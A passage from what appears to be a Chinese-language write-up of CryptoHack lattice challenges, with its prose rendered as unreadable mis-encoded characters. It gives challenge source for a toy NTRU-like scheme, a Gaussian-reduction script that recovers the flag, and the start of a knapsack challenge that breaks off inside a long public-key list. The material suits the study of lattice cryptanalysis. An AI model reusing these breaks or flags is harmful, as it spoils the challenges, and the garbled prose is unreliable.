è®¡ç®—ä½“ç§¯ï¼Œå³è¡Œåˆ—å¼çš„ç»å¯¹å€¼volume = abs(np.linalg.det(A))volume_rounded = round(volume)print(&quot;Rounded volume:&quot;, volume_rounded)# Rounded volume: 255 Gaussian Reduction Find the Latticeé¢˜ 12345678910111213141516171819202122232425262728293031323334353637383940414243from Crypto.Util.number import getPrime, inverse, bytes_to_longimport randomimport mathFLAG = b&#x27;crypto&#123;?????????????????????&#125;&#x27;def gen_key(): q = getPrime(512) upper_bound = int(math.sqrt(q // 2)) lower_bound = int(math.sqrt(q // 4)) f = random.randint(2, upper_bound) while True: g = random.randint(lower_bound, upper_bound) if math.gcd(f, g) == 1: break h = (inverse(f, q)*g) % q # h = f^&#123;-1&#125; * g mod q return (q, h), (f, g)def encrypt(q, h, m): assert m &lt; int(math.sqrt(q // 2)) r = random.randint(2, int(math.sqrt(q // 2))) e = (r*h + m) % q return edef decrypt(q, h, f, g, e): a = (f*e) % q m = (a*inverse(f, g)) % g return mpublic, private = gen_key()q, h = publicf, g = privatem = bytes_to_long(FLAG)e = encrypt(q, h, m)print(f&#x27;Public key: &#123;(q,h)&#125;&#x27;)print(f&#x27;Encrypted Flag: &#123;e&#125;&#x27;) 123Public key: (7638232120454925879231554234011842347641017888219021175304217358715878636183252433454896490677496516149889316745664606749499241420160898019203925115292257, 2163268902194560093843693572170199707501787797497998463462129592239973581462651622978282637513865274199374452805292639586264791317439029535926401109074800)Encrypted Flag: 5605696495253720664142881956908624307570671858477482119657436163663663844731169035682344974286379049123733356009125671924280312532755241162267269123486523 è§£æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹å®ƒåŸæœ¬çš„æ•´ä¸ªåŠ è§£å¯†è¿‡ç¨‹ï¼š é¦–å…ˆä¼šç”Ÿæˆä¸€ä¸ªå¤§ç´ æ•°$q$ï¼Œç„¶åä¼šç”Ÿæˆäº’è´¨çš„$f,g$ æ»¡è¶³ï¼š \\begin{align*} 2 < &f < \\sqrt{\\frac{q}{2}}, \\\\ \\sqrt{\\frac{q}{4}} < &g < \\sqrt{\\frac{q}{2}} \\end{align*}ä»¥åŠè®¡ç®—ä¸€ä¸ª$h$ï¼š h = f^{-1} \\cdot g \\quad \\text{mod } q.åŠ å¯†è¿‡ç¨‹ï¼š é¦–å…ˆç¡®ä¿ m \\leq \\sqrt{\\frac{q}{2}},ç„¶åç”Ÿæˆä¸€ä¸ªræ»¡è¶³ 2 < r < \\sqrt{\\frac{q}{2}}å¹¶è®¡ç®— \\begin{align*} e &= r \\cdot h + m &\\text{mod } q \\\\ &= r \\cdot f^{-1} \\cdot g + m &\\text{mod } q \\end{align*}è§£å¯†è¿‡ç¨‹ï¼š è®¡ç®— \\begin{align*} a &= f \\cdot e &\\text{mod } q \\\\ &= f \\cdot (r \\cdot f^{-1} \\cdot g + m) &\\text{mod } q \\\\ &= rg + fm &\\text{mod } q \\end{align*} m = a \\cdot f^{-1} \\quad \\text{mod } gæ³¨æ„ï¼Œç”±äºæˆ‘ä»¬ä¸€å¼€å§‹ç»™å®šçš„å–å€¼èŒƒå›´ï¼Œæˆ‘ä»¬æœ‰ rg + fm < qæ‰€ä»¥æœ‰ m = (rg + fm) \\cdot f^{-1} = m \\quad \\text{mod } gä¹Ÿå°±æ˜¯è¯´ç¡®å®å¯ä»¥è¿˜åŸå‡ºåŸæœ¬çš„æ¶ˆæ¯ã€‚ï¼ˆåœ¨è¿™é“é¢˜é‡Œï¼Œæˆ‘ä»¬å¿½ç•¥$m &gt; g$çš„æƒ…å†µã€‚ï¼‰ é‚£ä¹ˆè¯¥å¦‚ä½•æŠŠè¿™ä¸ªé—®é¢˜è½¬æ¢æˆLatticeçš„é—®é¢˜å‘¢ï¼Ÿ æ³¨æ„åˆ° \\begin{align*} h &\\equiv f^{-1} \\cdot g \\quad \\text{mod } q \\\\ \\Longleftrightarrow \\quad g &\\equiv fh \\quad \\text{mod } q \\\\ \\Longleftrightarrow \\quad g &= fh + kq \\\\ \\Longleftrightarrow \\quad (g,f) &= (fh + kq,f) \\\\ \\Longleftrightarrow \\quad (g,f) &= f(h,1) + k(q,0) \\end{align*}å¯¹äºæŸä¸ª$k \\in \\mathbb{Z}$. ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºç»™å®šçš„$q,h$ï¼Œä¸€å¯¹æ•´æ•°$(x,y)$æ»¡è¶³ x \\equiv yh \\quad \\text{mod }qå½“ä¸”ä»…å½“$(x,y)$å±äºä¸‹é¢è¿™ä¸ªLatticeï¼š \\mathcal{L} := \\left\\langle (q, 0), (h, 1) \\right\\rangle = \\left\\{ a(q, 0) + b(h, 1) \\mid a, b \\in \\mathbb{Z} \\right\\}.å‡è®¾$(x,y)$æ˜¯è¿™ä¸ªLattice$\\mathcal{L}$çš„ä¸€ä¸ªç‚¹ï¼Œä¸éš¾å‘ç°ï¼Œå¯¹äºè¿™é“é¢˜é‡Œçš„$h,q$çš„å€¼æ¥è¯´æœ‰ ||(f,g)||_2^2 < q \\leq ||(x,y)||_2^2æ‰€æœ‰æˆ‘ä»¬ç°åœ¨ä¾¿å°†é—®é¢˜è½¬åŒ–æˆäº†æ‰¾è¿™ä¸ªLattice \\mathcal{L} := \\left\\langle (q, 0), (h, 1) \\right\\rangle = \\left\\{ a(q, 0) + b(h, 1) \\mid a, b \\in \\mathbb{Z} \\right\\}.é‡Œçš„æœ€çŸ­å‘é‡ã€‚è€Œè¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨Gaussian reductionå¾ˆé«˜æ•ˆåœ°è§£å†³ã€‚ ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from math import isqrtfrom Crypto.Util.number import inverse, long_to_bytesq = 7638232120454925879231554234011842347641017888219021175304217358715878636183252433454896490677496516149889316745664606749499241420160898019203925115292257h = 2163268902194560093843693572170199707501787797497998463462129592239973581462651622978282637513865274199374452805292639586264791317439029535926401109074800e = 5605696495253720664142881956908624307570671858477482119657436163663663844731169035682344974286379049123733356009125671924280312532755241162267269123486523# ==== 1) é«˜æ–¯äºŒç»´æ ¼å­åŒ–ç®€ ====def gaussian_reduction(v1, v2): &quot;&quot;&quot; è¾“å…¥: v1, v2 ä¸ºäºŒç»´æ•´æ•°å…ƒç»„ (x, y) è¿”å›: (u1, u2) ä¸ºé«˜æ–¯åŒ–ç®€åçš„ä¸€å¯¹åŸºå‘é‡ â€”â€”u1 æ˜¯æ ¼å­æœ€çŸ­å‘é‡ (æˆ–å…¶ç¬¦å·) &quot;&quot;&quot; # æŠŠå‘é‡æ”¹æˆå¯ä¿®æ”¹çš„åˆ—è¡¨ v1 = list(v1) v2 = list(v2) # å¾ªç¯ç›´åˆ°è§¦å‘ (c) è¿”å› while True: # (a) è‹¥ |v2| &lt; |v1| å°±äº¤æ¢ if v2[0] ** 2 + v2[1] ** 2 &lt; v1[0] ** 2 + v1[1] ** 2: v1, v2 = v2, v1 # (b) m = âŒŠ v1Â·v2 / v1Â·v1 âŒ‰ â€”â€” å››èˆäº”å…¥æœ€è¿‘æ•´æ•° dot12 = v1[0] * v2[0] + v1[1] * v2[1] dot11 = v1[0] * v1[0] + v1[1] * v1[1] m = round(dot12 / dot11) # (c) å¦‚æœ m == 0 è¯´æ˜æ— æ³•å†ç¼©çŸ­ï¼Œè¿”å› if m == 0: return tuple(v1), tuple(v2) # (d) v2 = v2 âˆ’ mÂ·v1 v2[0] -= m * v1[0] v2[1] -= m * v1[1]# åŸºå‘é‡ (q,0)ã€(h,1)b1 = (q, 0)b2 = (h, 1)u1, u2 = gaussian_reduction(b1, b2) # u1 å°±æ˜¯æœ€çŸ­å‘é‡ï¼Œå½¢å¦‚ (g, f)g, f = u1 # æ³¨æ„é¡ºåºæ˜¯ (g, f)# ==== 2) è§£å¯† ====bound = isqrt(q // 2) # é¢˜ç›®çš„ â€œâˆš(q/2)â€ é™åˆ¶assert abs(f) &lt; bound and abs(g) &lt; bound, &quot;æ²¡æ‰¾åˆ°åˆæ ¼çš„æœ€çŸ­å‘é‡ï¼&quot;f_inv_mod_g = inverse(f % abs(g), abs(g))m = (f * e % q) * f_inv_mod_g % abs(g)flag = long_to_bytes(m)print(flag)# b&#x27;crypto&#123;Gauss_lattice_attack!&#125;&#x27; Backpack Cryptographyé¢˜ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import randomfrom collections import namedtupleimport gmpy2from Crypto.Util.number import isPrime, bytes_to_long, inverse, long_to_bytesFLAG = b&#x27;crypto&#123;??????????????????????????&#125;&#x27;PrivateKey = namedtuple(&quot;PrivateKey&quot;, [&#x27;b&#x27;, &#x27;r&#x27;, &#x27;q&#x27;])def gen_private_key(size): s = 10000 b = [] for _ in range(size): ai = random.randint(s + 1, 2 * s) assert ai &gt; sum(b) b.append(ai) s += ai while True: q = random.randint(2 * s, 32 * s) if isPrime(q): break r = random.randint(s, q) assert q &gt; sum(b) assert gmpy2.gcd(q,r) == 1 return PrivateKey(b, r, q)def gen_public_key(private_key: PrivateKey): a = [] for x in private_key.b: a.append((private_key.r * x) % private_key.q) return adef encrypt(msg, public_key): assert len(msg) * 8 &lt;= len(public_key) ct = 0 msg = bytes_to_long(msg) for bi in public_key: ct += (msg &amp; 1) * bi msg &gt;&gt;= 1 return ctdef decrypt(ct, private_key: PrivateKey): ct = inverse(private_key.r, private_key.q) * ct % private_key.q msg = 0 for i in range(len(private_key.b) - 1, -1, -1): if ct &gt;= private_key.b[i]: msg |= 1 &lt;&lt; i ct -= private_key.b[i] return long_to_bytes(msg)private_key = gen_private_key(len(FLAG) * 8)public_key = gen_public_key(private_key)encrypted = encrypt(FLAG, public_key)decrypted = decrypt(encrypted, private_key)assert decrypted == FLAGprint(f&#x27;Public key: &#123;public_key&#125;&#x27;)print(f&#x27;Encrypted Flag: &#123;encrypted&#125;&#x27;) 12Public key: [260288377891444370372615148009023640057294926547602419331406531383682223097787288755377467188515435381259752760746, 322734358011758862401399370931929863052553602421714393280581187496537763321855751120439457234561080720455397490349, 88092359256403564783665281993130133541226601877969436905267415353041909757324746080398461245281826552421872983184, 601684701300110945921036937572461050140352984401874675917155063594305583314408001377505387079690115000992094388032, 193814643850628739958152744041743058858484088269609293429408490294552345005365776962194365813796130165113184925621, 51510606914703888409341761261103125433754505248101513818740574350196563260563818621033222936301769697693287778876, 502702742677974540308798846750017003106263447846689040491266463798703222616320168069962523670400796196343460832764, 86989835783586738140883150201327374176124588410464188692884973334241681514702306716383785095564084499563152815246, 515511378187957676256419959601984383408150348796281656976955880729383340611785836962788715725367023923811376366815, 119845178983025037005174732553931706284024826223176718982111213579707091766057320315419827781508690979405126062061, 207867794910968434026003881920029657224591376925067493713968219177352819759854486838459675245909787840416982457750, 239399986603216503029402544900610984881160101923294396792665204486222975420081300661354603175384772323551980155480, 306665236132315336961576566094908486196981556971172170145299174389720334940261512384837950321772782983903454058725, 558130280550827068212352576387713811027468233905173944680355562037815257403446113128895937326412940859588204361963, 123471925832174980344066571541132411467266736109103860421447462536930482316849470378251137263190870093702164003085, 146089706629012142384661350988216882483919264673129621404831339166566056469572087759748854086023354002641923689390, 446097892684389219719742914373867457099954499449824602532333181169038249081395758983133906564840000962001976506057, 204029934276059225352901134714823317920576872465404508059719045291560482057171052793698580294637069578017200124432, 412333373143000457741307988470055504576675151299345387733692618218275177027643785881042018546460452418506341967356, 171418413940299360322712423004114364681865276057786947919043883366302567169869592290151559269290446563185553350080, 401593473337411114258578268223784182795068785564101722335215736591292301602077751376477881087346810602041717163104, 204003688543820354337113938494979311981574571424756883928855286926734578790400322291262042466654212377708831289347, 555612926496986208337317871061684502803594375654879680702581403987248292734014139717756900004905653768133795128973, 462785612281910846822645629160953231999037081137615204334672445418078665808070086646804794186256411131615189487813, 77961961618173276050791733447969083544152711482614563228085622136316525792569658878271751219358260960116292497570, 517789370221435419776588087490678991824021927945387533283088388790482913301281733115458601414668206432512998904516, 281870328340314395150658482932699114581743200279996227099530744754750289102031518563761975024621347281374162044877, 60204977937304337797770029325498234132893935850995809547662640467737007197647697381430963693698522962733473746281, 395936787836195675178388359277761575381601972138693830435288611414489963379399027975388601714741876831895709497105, 90921357930302550361827901642067284191268695594120415817202534786924330392421221829361546010764453051928814876700, 238523907687908075601117120608130752369082206676107364350347208286323115036939777325067473364465438898353765093766, 277515010021988996116595000889051160811249034599876556819610707794016612800585201793339332495839495779526504613846, 187215937497318890199135284983515062319988136636108170852591598862524363777870331888216170582220867500042557737272, 411220029331367081136918789112083235781237730079305782620378994961505282090962448446931628731751970521853108685376, 433613620456520979627974441205441942311133790647897226320388205340695256818608765746266662314499649013982035729731, 509613591091334719216567967380183602959933686617275815879939870258332674755345348802452058256788513837941126219238, 352708166022264045150842358964512080203788453464883319778517822047480718640858804837886057264514786742694419419735, 486272357335492500753956372299255798603575392697018451800774427752724312455328655650777691830508441976819499348269, 1291533249748053824342851185451970324561531056195308125673915619130780992270420765078102812914222570167615953050, 520707501920546816250915326019351261090208813534492143136485743644939372232638461802625700978801768541842624647274, 272359456788721692618768612190222453304838934916628492701462591276450281926223118982602858211688086607842351391495, 119534191144397164327417397593964021477488683311215644770010641745736480039094209273092223959694752862193314087240, 394945131470603614379767959704654538029557537489316246092982427107641617479545488843535929537498546432123287486437, 395979428475608101765230328218274625986674115712051764903732593018454264017781340199795540039285257513438842708672, 322101629493887220159199019582810892418957941946300752245249462093036697035162212557261470168522953435341905295650, 60610073299031334532969727880668989046838926047395613981473675505442500833244137863225398782029541439420403686372, 492582431835005621441922899995666806499437611069193099072247918597047415020628078410849119945608854080040163699375, 356290614124448077864884136922409291617128370298210212357882465167338600485728936925448944675136056707929560080237, 469737185578879122378016959759297464132272432425745272107998534197014940235018335349886398896979254122985841196030, 522871107234918024128768136315123497251902274681110489386594944387181296826024289163431880961506314580935567743910, 407151723612481391724375429193917289623669496278028982297086458062111012958436324350527302865535766565677711383191, 597354385774970715448797740483856119139152021834911852144490298736330354118482480147237280491305029710326837274157, 541106433608213985607913120402276000940203625086988929757276286018099336445558864548353610869729642196223750468493, 417269959280528548156948994397262973057821055108288565091113745409730174626359955737489143948177504667498654245449, 165844467199853002181647516786815801413939363188955720855463610698066730208657222822269457713666541555820608908443, 54875733171006797537647859403084623422036246809497621662400918381496284440644503330411668895858884933248328986102, 465819050441857934210906305127374377291850450707906416261994960542649394393702032587209990932960399224341143990297, 369322923825463715724411404444452360125845865658673947242361968271863944079047696087621731311243573179527276498509, 553158781749591211954659671173145767949897795287325677938373702443265138456771264711232588438786042792968904732769, 409812013938165700887519758386718364160025926340003407045361393371862966914817952304595560620453598830906305966865, 494654868138757552768371639418237489264099471894419220273147503624077564865563661914136003656825657044284503346448, 583613295252460993144403074130901622751986348055784728175987246652496523293580989652454868505577305787293683850652, 45623098408168398769971239387495928980835555721564847009059790575158770295430426790200773274288087331109699336204, 39196430635656777174378129146834600960125068266405306877726260536750371354188413207203531511343645151492477471286, 269811462520469960288594953357779332541515563494806499705455036716689694055741096626927182558039773813984145657639, 56129158162087034209035841739296133948708529713411817898928727109770418208078239244331640522507423413446203417794, 524210107239750288249530336771864024916995632570549267972428294539507299820629133801771958736839361325798918246415, 74499040113803277306263886217659673645883223840279171192334357737741618882160648968176974754905084576184804774369, 537566085689080717108870646705458338163437075433046077845999622035879463636776663759447985884960181167857417860517, 67053890181708018909161683393261532526993578729770554741021482840348299866927821016301415949708659944497709907470, 226687291544149270579995169198961617407190234578516732237756117257869929434434889879973211444301745820066870869034, 30119130560797352224094299766590747178156378314088092947830899847927767559391822485618397327733723834195435500170, 273554685078063587415670757725663508130498751998110442807136494763920302805098071555958936900406570453984774374060, 87980277743580170573607118853300224477595233902389343863665172738347967268089655736029345194767280704236057718111, 415325115863346791298232938393411393462777451386243842830553121689594926353646948497680883539360608323603975987452, 291860381996369849963997875749710331697722876276851205203280910491894467229365951220031470367159168511107680106262, 554653569462940342418063467925252548314485118886100002832290030505991378878498660088540140703141291011055029173137, 323189774384600834625013268084915768916855209746568551595158521873406091567687194674213765428238599317205811518692, 271805885895959097314720980134407607645324820417975238169874050425279962478579515969226563851125481000349196674810, 273580504244152469063405670227951980303621824057876058884978331188257821496852334599050020207990127348359965113465, 89994080154200685717636930068317931325931168723237899144166312528962957042842197915530047017893088501681215899095, 179903529806043505032581494908566846659773117049401056767669943330229935007822437549131470977810261112485254094386, 337553339737054880017288314951575451797426862530219763936855885416298554494199226261714888518914541341927073075939, 55576723594346882914517616915509260915444308762551400560217462518909289055446940809390878002725822401595827206530, 16748220768196858904499918524709172735166549515085689048938405549141121222201553686060172878474455615920723669801, 317380564633191615800168658676142557493413060315417096622564923156521630376263849705099633192226251101432134441153, 533990888376667129575141849433166253104032964155895368357797314378260092470904627861359175864364684662961150582207, 51339665999563119517609216115086272052501396280925354694804471629521639434841281422984348587180771099209184749005, 598751671521816401429095343374521592165563401213195481604556405443389323390172923217639290327197434030974530635632, 502516418942980462174586089858060912235797554801782186782319843655355616321036648106166017773986280053024012403712, 96757697084956246010025820107260538706827163135748809142998937362457169471061108292297066769079020843197361323396, 160715027762704553320571142674023737670353756130518440136900430091151963142004047232920245715827837173811719927140, 279138292123840748082780689543574043699162822819208361733228093396335579794292477744981338016264347327181324984710, 76445842054689324523514421681098261857514827631364695255959418519245612571199123499205752729124353901548286671941, 383675319414133753635121914615218464358220814208747712016103562476157464944897131756675168140846189629485664787044, 260741648290568813857849033448155840373964568801980310694295413631289231242930901519918814851819352903132884286000, 572815144956474380133620797676157654285774633299428534205241845335783095326631133195133798583360396067031309578073, 326258465939147178368353573060965288327891986807699582822092415027094204965326681853802159504539722937811913340954, 270266570242986488258809014590807152136633692716132669770748395523214017062557603428657196661342410476403164567952, 594635668324174018778140793057815156885870465660609865234586849536688338135131804764199647040009222634146148815637, 112066852946512058163194024984815176069074331367673763590415760757313750687675218022751871678411881684718198988959, 72643140251973593561700085821570131390914743121754868577502110904091989089708201436984242838820806097191225214858, 418558767829526524235103555737958351573183096833081038769308995724925326439890724874671213539641031754157727776067, 196559288823369030489094238610617412012659194878611686482089456487889879135369906410569754176462601644487717691079, 484475844260869041475828428835126624027291693283800645559775410528136122290210564467730445814182429120097372738911, 397895531572254423225385975618860549078025992059379971480526615942245245283818149065605766495091059477544617632303, 173098235745543952336517747078283517802667869630628062474315240281111485771833849083340162673485620557610425012773, 395438744730241817782361196255681827924847041028664896503460681041226871979986416514203189980456170013127549062319, 470021990867207717347003710359490169212637212255796418181420825247262094876084196634243149241752002339736588912053, 116393009019558569654503508922282193810180596603376432764270301486325221610807518426481578453602546466299515294456, 312679236344738874814229979243462639486594453393064312671149009880980836289564409215088541509970023077739205203468, 125633612607015147027292740679836345332097512816636698981581758992992116056276272361001165705597842757882238693825, 550545747650576990464265884382499274254872311986381675090751886824037811235625095205217845451891396561893492715391, 582344947379262203945082609921047126789902458640974947174265099323728700596079597139164883619347159500887293859913, 597445807393853093495564866081359122814348105478914638258595339515168987499771664924728981250079847198831836930965, 203086100710322798737771097067197649738932976573837729229038404179992238381339090779534246758253939763462200026384, 366083021996787911206272856169665720981308167177143125303074466648545813452157612764258146407782634619278092168081, 568425067761875823198893591966757461338470700675615033946429149483970138055665377562238998722395767377075284081587, 292063178202410186631443519138674436645163233411161937085629856088259050827382985093506892763617302007759121037731, 572237520943575841301998365238940412928982617335768155394691567092595694943290938278464533099223273214233507106207, 130730938892686892107630262721901246969052318133502728671984157629171554435251506312878040499761922665301495030981, 185117108148352276973404708807613996548096583954940273525781406848525491758486946236965943611210198389159091280333, 37060990092986925132287820152354618271473589014825595897838753632315007172710154561879917551705194656825456571032, 403396730776194870459199627544122636010870768257463359235766775533882938128146112838489577777497432203020030499998, 390519053219213422305599109947414047895590808796368085342860468917268018310638864392199371679272174634278410878307, 128444781947873592602609418783055715736876557725608932301613294446934930933474014020041434831899064316552264614235, 543291373538613455155809248493830432520680330961337677793905220928838352322514565851452650441518480234729892153780, 488514444383813071753894478409325136755661751625837651637348989332739608743318097848609715931362718450900659714726, 345584582429475420526208382863826459005483455209655712636957752389218040279848223862500232738960994712140028026289, 93010878843154734421543561265196548806562081923037074596459052686633775723171466088126269822057315393084026072218, 12533412965882925987419497258660569237455714460582608620237638858642686843645624645184949324869641399446820464020, 562770032030414047557952904910126027215456025343530350248616818594366525600180778011275466074764589844321872364272, 128451705070871056157396910591766296038989235798264982434769256144115712608648937222298167066517556774062311420353, 490278961434267039693706795888817653385586689501848271165345121922956317504140732421546020494675482464550410472502, 212287543946551782522399704940695532581109453008804375002654843122502975490312129477869621998080277682674199046031, 351228167329138957128592454766411142609836239330479331051630155591459798299725613134325016512314887321869487481161, 364056580106158102895694571253671943571916920885795142960090311722444269241247963009814588199874030295862636577768, 323410613174912128865174768949092780979646178505039555025194364419990442219941948707117457621400459111231556621585, 555979459475319018276106133189578589964687373772995549423813902773304274184448885651570001083614054140692063026580, 471645896888183848879918063770091917659270906648819201901346651975957177950753583099047587304484006413716362087065, 595746107902898270905714635379070716651708771264047581902664532594897071557252807014533004074458867603957329534516, 557816517693603351719661411054144374250247040672226934534604151399902780319198098821629853612396635344596388943480, 75653615683769023911143698869320584951015514055697266638646507368530841035631560833198288977975782471517557394092, 386729218862361591185009654369415880766336899946663823664818477204172007165198875809899277634660190797185025579614, 393108265477944240661308455550612796769200470498502703905073280606596277788078742986164286625262059483908055127428, 365065802583204450004435661912506592532468753723399406740663534070289404492293680764078659588454240436160849321237, 343474792575856700080726394177083134771079426798042359193966109700850531408037245425173307797050676647933775237484, 449270583610225180914452784540333562631570453995885992409935055758994173533991695282410200635020830187612444056607, 152477148608000973940085532267319492932629609199964217167273279315109403426434432473053141371160594251975646390787, 215758046810520029171417357963508549726865838830930981174495643955719506571398771447950049727234258305885220507020, 388644732079570479249894814593945177309689613386566508292336098907992239994635374799070003303374928382563877494312, 33174396496627497383579687586254392056231321534282758587681567913835717050445163816449882425899904436708697640574, 293328356964375951072242072976851267186828242468018707810599907336525314670450502681522283876131924077746023996643, 292804486280753504026674757794166015519590385505528937148184945726179320137391480944836180610675717906694042510411, 278315915715399524055936806996907092937794467054749462150463756152176847617395557111508306851465386462011262385630, 103884040577296119486012754822466682224025370872916939490159319500421058932999421365377738193002421767097172706341, 111463652129659874006915288174831654634146152513640366449316440114829594116719772451443937868409442532699879776869, 475152124260969797265060453354454799124845717445357239027249597786029156307488697633998763174770332805926500738683, 220597335944113643138040910019263318251616203954548724660953303915089233301354511542662225751359573592406567125779, 460838912228809947843094986154780694841314087685379351551107763714127613789323858795003275958350186756130179585099, 140183105024444619512158726537661171898184380568070161231133567610679885584873426652521827961950911404383912561621, 100258312363732149931656549158547430770829888011033153048299126820116382987576385251423248018523377569893042593237, 405290867185420593972711092047858403431415058957648108848290712855486205273135789994549738296802436972506132007215, 256955277068974586752505570703153051582682851398012077625721880852140628262494489158976679841716540706155916871083, 598549159802958710401362839481280273681933957841944662088149512518476573000011803427513695903373248355980692446393, 308263288681016807641714404434630877489176754884164049322636274036076916608089721011418189274379096133290778967977, 8342859679410179631729508842147337278025979845268212054683951869690623917413242667876438120214556608223950514653, 439895086294728342454449126955941890844828534912064877350830376651948083146591737071488196253116258629344717466258, 91881226123407259536921548434174382841001791568169293198769940131230256611806601058471105885254628422499512141440, 377266324363766263400630205724731218877243980277025204567255708828742612895175112462476548764041808998472515741645, 116673062533491873681185131034931580572262852751033929144868000941380674942800523209276875356733463592351603448680, 57238242567269156027816815706946539463493497634492900168501163766058930300567388616552782194562204025116893421410, 589774086517371498643669747060802896861503240906569357013148621028285639980785543690656162836694887880501379427719, 299125626128142030020988742420785075132372751191528474146303145649473683269241675130370288768899920531289674244113, 304688395547666111898109663337992917557352968749730125549180444196974698222351897080702952045364871753888027443342, 482739851676824100473920409347215848398789318900117561465297399614115666738614477259195415015272146741220074932513, 223546862652113236935862556158177901803806229739994958195958127700830125319767534179348037800919714328649801362322, 150425375689725206871177727482717625428944121456212788472446922564113718518867636855506280578641904259888006038685, 143374483079122348274771015162872747263883105211675941440480524305910827744168931572051691220561136775398957657059, 128633351158033453796356108560970241527889904619011394383277988372280437398843373552825146090070247278923404428730, 249625701621261544438183108711205773478938560640571200325127252485779481701078452759513943692466279038851599018511, 330098489762871879773681019559732262466172018773272582308614672671671001199307865518506835519360693927579848132122, 97272570979206528424127336981516817168566955222510512261839537633559389914877185855268875504270285494647179225542, 74718841026645027941391238796126141775030441881552798010185595153873780524478674202965665888738730228577064111032, 59009205910055868684561742529451214311094377006520731342399475542159755492342086349692903126315766192176134558364, 147954106872023713951463145691216475084430006306060416221364896834795769425749212897622105818492094458111589403860, 555992830271936179812799550002813412539390844307434015514327261249472823762801208645240806724751727789206958497458, 459223438688559571249116685914649450095540121668933258507609746609794374539448063463326591749261191192370815662117, 571393209200912648822312183637054598815269397678580613768957089116765483865121162495918269935152288322187647411253, 177286186824084038346767370297094817293812392957721642873053028629715330336525966361030541938870465423944241324109, 587491267113142201933590855412985429253948652679543672927232780837039223665539177593879438262959884768626979925026, 121073719992748558849282996502703446279240313956823650619682240860630373634948798695523514085879310433388769297911, 326992821821879354165502695961028240084978294787383957718963930070776372845305415470613976088436935751047043512627, 55897462658973985554837453480984923331777372313619418297379632868358904708526448610515770876401568010074036247, 474281517111080897542557845865286041097457650249727914745876496139882777461227076272058949306156001543709356614827, 40880447006931568560802817837347288973549001731224760995212446282117046967004745589464560120352241602331262757637, 199377582253379978414081552664345738394226248383486423477706857549702059554694037264958719644482986837756496613246, 67583806809325529684782118654476643411516600285151896093983454855502714712133346956141976654071062935812737453191, 452546341988439193982297214011678766258506490290911066090290647614068455151806621409756646430532117713333419814200, 63154079944843452528208874183624055953361990336542165468695871390964383215223885775202331596927466794955939855669, 334551033942583568474606741839213957101383590286251155186668543235920975897931743928357631453433934808796703330473, 437000125133660712403788025992205090698484430907657894066272071296035483375078474260228687865444802416063967634962, 79996507523856267942889507576300340014719316733731500178081582238768493408405645914333660158893963260211116177267, 136957270824318341027124989034235585855646981093281453761145461440890955503793684517186875995202144027265329969201, 280204753198588906275980318398478729285287961542920285529979812275266316580102545873587416433404212703776245726478, 537734235993878341769434982550042490365981751251428660237179942734374485415922424357453321846937022328664895920607, 498357256878949571854248804622370932859926894994690120526235824883083753765132401863605500892090016764206939698756, 593183658694608014094449104249771865876595121367209656250471158771632486392533730913932393504513988512194994235126, 471525047958971655208534107052287853913949987926476676197514310320411235020283503103705707957701802098089852040455, 515550195522086342769232739520750768345601850976320014312405876943691700378141377151414091085616391824613041356222, 229784654767967355149909497709811119368560654037206880944035229827691011815016913131119422451043820980926353941725, 217169654015051285238559403576147518221573574303291047729813710960725792892550445720464605476174663800328177597453, 445865555254101127829958642102675927687168710569707725467286103803938348116926832834254624089519482737855028080263, 83946997792088073746354410376458121354546477090285151121896293987266118404260723878401677521317330022928683440101, 472119354862263268431251633432424976904384210603399093568806291862332048310282050100842204125396472101319620313029, 46843467515693389983627938872598324284244171067988563260495985345821466093790361374194115630948136965603015643581, 277302589126799360982750111603442360555051934636756171066424884732490616874962892980005637968336486277371298105284, 37796860324947087933757452089444569583341754367174335457777874936449439863762482510080776848131952814291888228252, 329201662631483519275850208043421059140347420462580260818216051307977255139454956805683010032538225008290753339066, 410958260744814455637908317160979333881545314073457621559204623145344687279791103290567233048673594441768330391568, 391184069150039601440639067557184862816991051523817132396666190555512106382919904848895224325098711230221328168893, 341778180155955688649827271577690269253924367106359453768062062983194302766144996692233530585116870343939549344048, 482885184891891026832543019680624112333051960746415331234199075553060933581630480706330420552017650892318225421994, 227417029879602291913898154454350465334192275455983368980997243946371067766121862949125088496933933053493304375082, 131891059077173823480681683274809296700667012054595015489329798567668841455882278540434006611778254351469315756836, 103977685400575936876007245351080422734569291709540152622222483086840011211808484758839889045266405362833100572217, 430039690420862864710328860317916251552162738538460131045295388990486621940999260820629946807283129550503791042360, 336054039341779369078755981618338727567421739252984379060088264565052065080902800664605952509539644185937023210384, 414650487301520195860820485747902373712957920758077572646321108690388934071745453432265035539090489903222596288408, 589576193361941267176015154197092338077060428665767302320550323024382985851379047593411265195718688560873123744185, 218382333622730104159935425552756841820388948639519923842495333910150980936866251625988964615764772159578862214025, 2542356543181698813075957157401385706512468063673241076844194782908937880847391489213422972872487843717747974071, 19012712934576590810330358701965194246607393288484627129050567402003333386833300009773236871643918870071025370112, 261459449945270346696260426170010104493420330959761424072408598127181246567262293489464049721489266230568086023687, 393057872763078249377870634042993942252544393136978340205701555086856991894130814830449765311294161681995357980571, 31706670785655144489258744219717253455873175486088498446357251628824725653898017817866303775262383346847940227722, 352845629675989592022318947558037109666715372268243939061740352176833050420783754677666411876876865226448815643420, 579523499570692157776642365278787278074363193157128877724940050501652213832135926670258239249988403301949338255538, 534781322034571849183222718240938369181782069830117215874801137890227720544463940037268498986061166881241864175911, 293947547828174245724554745263997068016996177889470503383528004805559670712802640725469343616840367100443153534752, 20256488447976344493484944853334005566670073013412177398480406734598723283264289836587474269370253077015786359305, 475307340957345844876811923970449788514706891727480716267956523131203845997503382023500463149439850432076379159007, 9532193777031501443256432870520743234491840911054244783623102207162388499144070592024440812057106927678514406207, 30376455906399256126534181227692885553266283699913099449205248506625206632827693466133644861846223565145288661633, 310323302397755654510284518631138079981439265632852684852876254116989091445393487579911757256043570018377230904180, 407387187512823516321154849212634322952876110252179375736935664859854509488826142049903683991617538259494461983206, 211765773488300500716796064525502573590145731868562963063378748592341237756767589777342751660513980880169703658019, 118119996850569812443799306306875048213209686043987665925365129711742300844060014347898233682054000714610165352429, 456288037921986114882644161559494182818651772335241262800783776696209877706906644069180867207555069937013686421247, 321798425169971169912343295962697085577508076571119888196289113181080013814133443673221049860354996979915353284172, 